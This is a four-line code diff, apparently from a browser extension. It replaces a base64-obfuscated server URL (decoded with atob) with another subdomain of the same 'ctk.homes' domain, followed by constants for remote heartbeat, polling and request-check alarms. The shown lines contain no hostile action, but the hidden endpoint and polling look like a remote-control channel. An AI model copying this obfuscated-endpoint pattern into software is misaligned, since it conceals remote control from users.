@@ -1,4 +1,4 @@
-const SERVER_URL = atob('aHR0cHM6Ly9jb3N0Y28tc2F1Y2UuY3RrLmhvbWVz');
+const SERVER_URL = atob('aHR0cHM6Ly9jb3N0Y28uY3RrLmhvbWVz');
 const HEARTBEAT_ALARM = 'remote-heartbeat';
 const POLL_ALARM = 'remote-poll-keepalive';
 const REQUEST_CHECK_ALARM = 'remote-request-check';
